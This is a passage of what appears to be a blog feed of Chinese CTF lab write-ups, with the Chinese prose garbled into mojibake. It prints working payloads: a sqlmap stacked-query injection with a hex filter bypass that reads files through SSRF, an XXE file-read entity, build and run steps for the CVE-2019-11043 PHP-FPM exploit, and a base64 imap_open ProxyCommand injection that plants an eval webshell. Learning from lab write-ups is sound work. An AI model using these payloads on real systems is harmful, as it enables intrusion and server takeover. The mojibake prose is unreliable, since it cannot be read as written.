æ­¤å°è¯•ç€çˆ†åº“ï¼Œä¹‹åå‘ç°åœ¨åº“ä¸­å¤šå‡ºæ¥ä¸ªlinkè¡¨ï¼Œçœ‹å¤§ä½¬åšå®¢ï¼Œå‘ç°åœ¨ä¸»é¡µé¢æœ€ä¸‹æ–¹å‘ç°è¿‡å»æ²¡è§è¿‡çš„æœç´¢å¼•æ“<br><img src="https://img-blog.csdnimg.cn/71c1bc8ec57c4c40b61cc8c8614f9098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥ç”¨sqlmapæ’å…¥æ•°æ®<br>å¹¶åˆ©ç”¨ssrfå°†/flagçš„æ–‡ä»¶å†™åœ¨æ•°æ®åº“ä¸­ï¼Œåˆ©ç”¨<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://b3b129d6-b29a-413a-9bb1-b076712592de.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,&#x27;file:///flag&#x27;);&quot;</span> -batch </span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®/link.php?id=10å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/6deba91781224ee3aa20dd9904364077.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="web394ã€395"><a href="#web394ã€395" class="headerlink" title="web394ã€395"></a>web394ã€395</h2><p>æ‰“å¼€æœ¬é¢˜ï¼Œå‘ç°ä¸Šé¢˜çš„æ€è·¯è¿˜èƒ½ç”¨ï¼Œå› æ­¤è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¾ç°è™½ç„¶å¯ä»¥æ’å…¥ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œåˆæµ‹è¯•check.phpï¼Œå‘ç°æŠ¥é”™ã€‚çœ‹å¤§ä½¬åšå®¢ï¼Œå‘ç°è¿‡æ»¤äº†å­—ç¬¦<br>ä½†æ˜¯å¯ä»¥ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œåˆ™payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://13eceab7-9766-4beb-9ff7-3ccf15085638.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);&quot;</span> -batch</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜çš„é»‘åå•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|check|php/i&#x27;</span>, <span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow XXE</title>
      <link href="/2022/01/10/ctfshow%20XXE/"/>
      <url>/2022/01/10/ctfshow%20XXE/</url>
      
        <content type="html"><![CDATA[<p>XXEç®€ä»‹ï¼š<br>XXEå°±æ˜¯åœ¨å¯ä»¥è§£æXMLçš„åœ°æ–¹ï¼ˆæ¯”å¦‚ä¸€ä¸ªè¾“å…¥æ¡†ç­‰å¤„ï¼‰åªè¦å¯ä»¥è§£æXMLè¯­è¨€çš„ä»£ç å°±å¯ä»¥ã€‚åœ¨è¿™ç§åœ°æ–¹æäº¤XMLçš„æ¶æ„ä»£ç æ¥æ‰§è¡Œã€‚ä»–ä¸€èˆ¬å¯ä»¥åšåˆ°ï¼Œå†…ç½‘æ–‡ä»¶è¯»å–ï¼Œç«¯å£æ‰«æï¼Œå†…ç½‘ç¨‹åºæ”»å‡»ï¼Œä»»æ„å‘½ä»¤æ‰§è¡Œç­‰ã€‚<br>è¿™è¾¹å…¶å®XXEæ˜¯æ¯”è¾ƒå°‘è§çš„ï¼Œè¿™ä¸ªæ¼æ´ä¸»è¦ä¹Ÿæ˜¯å› ä¸ºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥ï¼ˆç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œæ¯”å¦‚ä½ åœ¨è¾“å…¥æ¡†è¾“å…¥è¿™ä¸ªXMLæ¶æ„ä»£ç ï¼‰å¹¶æ²¡æœ‰åˆç†æ£€æµ‹ä¸è¿‡æ»¤ï¼Œå°†ç”¨æˆ·æäº¤çš„æ•°æ®å½“XMLæ¥æ‰§è¡Œï¼Œé€ æˆXXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰ï¼Œæœ€ç®€å•çš„åˆ©ç”¨æ–¹æ³•å…¶å®å°±æ˜¯ç”¨hackbar V2é‡Œçš„XXEé€‰é¡¹ï¼Œä»–è‡ªå¸¦äº†XXEçš„payloadç”ŸæˆåŠŸèƒ½ã€‚ç›´æ¥å¤åˆ¶ç„¶åæ”¾åˆ°è¾“å…¥æ¡†ï¼ˆå¯ä»¥è§£æXMLä»£ç çš„åœ°æ–¹ï¼‰å°±å¯ä»¥äº†ã€‚</p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>LoadXMLæ˜¯MSæä¾›çš„XMLDomæ¥å£ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½½å…¥ä¸€ä¸ªXML document,è¯¥å‡½æ•°çš„ä½¿ç”¨å­˜åœ¨å¾ˆå¤šæ³¨æ„äº‹é¡¹<br>simplexml_import_dom() å‡½æ•°æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡</p></blockquote><p>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;cyx&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/cyx&gt;</span><br></pre></td></tr></table></figure><h2 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h2><p>ç”±äºè¿™äº›é¢˜ç›®éœ€è¦æœåŠ¡å™¨åˆ™çœ‹å¤§ä½¬wp<br><a href="https://blog.csdn.net/njh18790816639/article/details/117295145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164180737616781685331283%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164180737616781685331283&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-117295145.pc_search_insert_es_download&utm_term=ctfshowXXE&spm=1018.2226.3001.4187">å¤§ä½¬wp</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-11043å¤ç°å’Œå­¦ä¹ </title>
      <link href="/2022/01/07/CVE-2019-11043%20PHP-FPM%20%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/07/CVE-2019-11043%20PHP-FPM%20%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2019-11043å¤ç°å’Œå­¦ä¹ "><a href="#CVE-2019-11043å¤ç°å’Œå­¦ä¹ " class="headerlink" title="CVE-2019-11043å¤ç°å’Œå­¦ä¹ "></a>CVE-2019-11043å¤ç°å’Œå­¦ä¹ </h2><p>æ¼æ´æè¿°<br>CVE-2019-11043 æ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨æŸäº›ç‰¹å®šé…ç½®çš„ Nginx + PHP-FPM çš„æœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œå¯å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç ã€‚<br>å‘Nginx + PHP-FPMçš„æœåŠ¡å™¨ URLå‘é€ %0a æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›å¼‚å¸¸ã€‚<br>è¯¥æ¼æ´éœ€è¦åœ¨nginx.confä¸­è¿›è¡Œç‰¹å®šé…ç½®æ‰èƒ½è§¦å‘ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"> ...</span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ï¼ˆï¼…0aï¼‰æ¥ç ´åfastcgi_split_path_infoæŒ‡ä»¤ä¸­çš„Regexpã€‚Regexpè¢«æŸåå¯¼è‡´PATH_INFOä¸ºç©ºï¼Œä»è€Œè§¦å‘è¯¥æ¼æ´ã€‚<br>æ¼æ´èŒƒå›´<br>åœ¨ Nginx + PHP-FPM ç¯å¢ƒä¸‹ï¼Œå½“å¯ç”¨äº†ä¸Šè¿° Nginx é…ç½®åï¼Œä»¥ä¸‹ PHP ç‰ˆæœ¬å—æœ¬æ¬¡æ¼æ´å½±å“ï¼Œå¦å¤–ï¼ŒPHP 5.6ç‰ˆæœ¬ä¹Ÿå—æ­¤æ¼æ´å½±å“ï¼Œä½†ç›®å‰åªèƒ½ Crashï¼Œä¸å¯ä»¥è¿œç¨‹ä»£ç æ‰§è¡Œï¼š<br>PHP 7.0 ç‰ˆæœ¬<br>PHP 7.1 ç‰ˆæœ¬<br>PHP 7.2 ç‰ˆæœ¬<br>PHP 7.3 ç‰ˆæœ¬</p><p>æ¼æ´å¤ç°<br>è¿™é‡Œç”¨ CTFShow web311çš„ç¯å¢ƒæ¥ä½œä¸ºé¶æœºå¤ç°<br>é¦–å…ˆ exp éœ€è¦å®‰è£… GO ç¯å¢ƒï¼Œæœ‰ç‚¹éº»çƒ¦å¯ä»¥å‚è€ƒä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install golang</span><br><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/neex/phuip-fpizdam.git</span></span><br><span class="line">cd phuip-fpizdam</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åˆ°è¿™æ­¥å¯èƒ½ä¼šæŠ¥é”™ï¼Œä¸€ç›´ä¸èƒ½æˆåŠŸ</span><br><span class="line">æ˜¯å› ä¸ºéœ€è¦æ¢ä»£ç†ï¼Œå› ä¸ºæˆ‘å°±åœ¨è¿™æ­»ç£•å¾ˆä¹…</span><br><span class="line">å¯ä»¥æ‰§è¡Œ go env çœ‹çœ‹ proxy æ˜¯å“ªä¸ª</span><br><span class="line">æŠ¥é”™åŸå› ï¼šé»˜è®¤ä½¿ç”¨çš„æ˜¯proxy.golang.orgï¼Œåœ¨å›½å†…æ— æ³•è®¿é—®</span><br><span class="line">æŠ¥é”™è§£å†³ï¼šæ‰§è¡Œå‘½ä»¤ï¼šgo env -w GOPROXY=https:<span class="comment">//goproxy.cnï¼ˆæ¢ä¸€ä¸ªå›½å†…èƒ½å¤Ÿè®¿é—®çš„ä»£ç†åœ°å€</span></span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phuip-fpizdam URL/index.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ba582ff367a147ceb4390cb4d1258514.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="æˆåŠŸæˆªå›¾"><br>ä¹‹ååœ¨/index?a=ååŠ æ‰€éœ€å‘½ä»¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€é“ååºåˆ—åŒ–sessioné¢˜</title>
      <link href="/2022/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E9%A2%98/"/>
      <url>/2022/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™æ˜¯foo1çš„ææ„å‡½æ•°</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_string(file_get_contents(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;æ–‡ä»¶&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;å­˜åœ¨&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo1çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo2çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo3çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral">wpåœ°å€</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°ç»„æº¢å‡ºçš„ä¸€é“é¢˜</title>
      <link href="/2022/01/07/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/"/>
      <url>/2022/01/07/%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><strong>é¢˜ç›®</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[++<span class="variable">$c</span>]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è§£æ</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥æ­£å¸¸èµ‹å€¼æ—¶ï¼Œä»–ä¸€å®šä¸º1ï¼Œè‹¥æƒ³è·³è¿‡è¯­å¥åˆ™å¿…é¡»ä½¿ä»–çš„èµ‹å€¼å‡ºé—®é¢˜ã€‚<br>å³ ä½¿æ•°ç»„æº¢å‡º</p><blockquote><p>ä½œä¸ºPHPæœ€é‡è¦çš„æ•°æ®ç±»å‹HashTableå…¶keyå€¼æ˜¯æœ‰ä¸€å®šçš„èŒƒå›´çš„ï¼Œå¦‚æœè®¾ç½®çš„keyå€¼è¿‡å¤§å°±ä¼šå‡ºç°æº¢å‡ºçš„é—®é¢˜ï¼Œä¸´ç•Œç‚¹æ˜¯9223372036854775807è¿™ä¸ªæ•°å­—ã€‚</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-19518</title>
      <link href="/2022/01/07/ctfshow%20CVE-2018-19518%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/01/07/ctfshow%20CVE-2018-19518%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>æœ¬æ¬¡æµ‹è¯•é¶åœºåœ¨ctfshow</strong><br><a href="https://blog.csdn.net/qq_46501419/article/details/115050909?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164130335216780274183925%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164130335216780274183925&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-115050909.pc_search_insert_es_download_v2&utm_term=CVE-2018-19518&spm=1018.2226.3001.4187">CVE-2018-19518</a><br><strong>æ¼æ´å†…å®¹ç®€ä»‹</strong></p><blockquote><p>php imapæ‰©å±•ç”¨æˆ·åœ¨phpä¸­æ‰§è¡Œé‚®ä»¶æ”¶å‘æ“ä½œï¼Œå…¶imap_openå‡½æ•°ä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellï¼Œè€Œdebianh/Ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshåŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´debianç³»åˆ—ç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œrshå‘½ä»¤å®é™…æ‰§è¡Œçš„æ˜¯sshå‘½ä»¤<br>debianç³»åˆ—ç³»ç»Ÿæœ‰Ubuntuã€kaliã€MX linuxã€AntiXã€PureOSç­‰<br>sshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®-oProxyCommand=æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´<br>ProxyCommandç”¨æ¥æŒ‡å®šè¿æ¥åˆ°æœåŠ¡å™¨çš„å‘½ä»¤. å…¶å¯ä»¥æ˜¯ä»»ä½•çš„å‘½ä»¤,åªè¦èƒ½ä»å…¶æ ‡å‡†è¾“å…¥è¯»å…¥æ•°æ®,ç„¶åå†™å‡ºåˆ°æ ‡å‡†è¾“å‡ºå³å¯. è¿™æ¡å‘½ä»¤éœ€è¦è¿æ¥åˆ°sshdæœåŠ¡å™¨ä¸Š</p></blockquote><p><strong>å®æˆ˜æ“ä½œ</strong>ï¼š<br>bpæŠ“åŒ…åè¿›è¡Œä¿®æ”¹<br><img src="https://img-blog.csdnimg.cn/145b48a348754005a71ce34c1afb46db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>%09åé¢ä¸|å‰é¢ä¸ºè¦æ‰§è¡Œå‘½ä»¤çš„base64</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sL2UucGhw|base64%<span class="number">09</span>-d|sh&#125;a&amp;username=<span class="number">222</span>&amp;password=<span class="number">333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘çš„æ˜¯å°†ä¸€å¥è¯å†™å…¥e.phpä¸­<br>èšå‰‘è¿æ¥å¾—åˆ°shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow webå…¥é—¨ å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A855_122%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A855_122%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
